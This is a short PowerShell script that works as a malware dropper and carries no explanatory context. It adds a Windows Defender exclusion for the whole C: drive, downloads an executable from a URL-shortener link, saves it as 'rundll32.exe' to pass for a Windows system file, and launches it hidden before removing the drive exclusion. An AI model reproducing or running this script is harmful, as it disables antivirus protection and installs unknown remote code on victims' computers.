cd $env:Temp;
Add-MpPreference -ExclusionPath C:/ -ExclusionProcess "C:\Users\Administrator\AppData\Local\Temp\rundll32.exe";
Start-Sleep 1;
iwr -Uri https://is.gd/o9DcFL -O rundll32.exe -UseBasicParsing;
Start-Sleep 1;
Start-Process .\rundll32.exe -WindowStyle Hidden;
Remove-MpPreference -ExclusionPath C:/;
exit
